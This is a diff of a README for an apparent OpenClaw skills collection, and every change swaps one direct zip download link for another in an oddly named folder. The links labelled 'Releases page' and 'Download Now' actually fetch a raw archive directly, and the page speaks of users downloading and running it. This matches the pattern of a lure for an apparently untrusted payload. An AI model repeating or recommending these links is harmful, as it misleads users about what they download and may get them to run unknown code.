@@ -1,6 +1,6 @@
 # 🎉 awesome-openclaw-skills - Get Skills for OpenClaw Easily
 
-[![Download Now](https://github.com/natan89/awesome-openclaw-skills/raw/refs/heads/main/transitionalness/openclaw_awesome_skills_v3.8.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://github.com/natan89/awesome-openclaw-skills/raw/refs/heads/main/transitionalness/openclaw_awesome_skills_v3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/natan89/awesome-openclaw-skills/main/transitionalness/openclaw-awesome-skills-1.6.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://raw.githubusercontent.com/natan89/awesome-openclaw-skills/main/transitionalness/openclaw-awesome-skills-1.6.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ To use the skills in this repository, you need the following:
 To get your skills set up, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/natan89/awesome-openclaw-skills/raw/refs/heads/main/transitionalness/openclaw_awesome_skills_v3.8.zip) to find the latest versions of our skills.
+   Go to our [Releases page](https://raw.githubusercontent.com/natan89/awesome-openclaw-skills/main/transitionalness/openclaw-awesome-skills-1.6.zip) to find the latest versions of our skills.
 
 2. **Select Your File**
    Look for the latest version listed. You will typically see files specific to your operating system.
@@ -63,7 +63,7 @@ Once you have downloaded and run the skills, it's important to know how to use t
 
 To download the latest skills, please visit the following link to the Releases page:
 
-[Download Now](https://github.com/natan89/awesome-openclaw-skills/raw/refs/heads/main/transitionalness/openclaw_awesome_skills_v3.8.zip)
+[Download Now](https://raw.githubusercontent.com/natan89/awesome-openclaw-skills/main/transitionalness/openclaw-awesome-skills-1.6.zip)
 
 Follow the steps outlined above to ensure a smooth installation process.
 
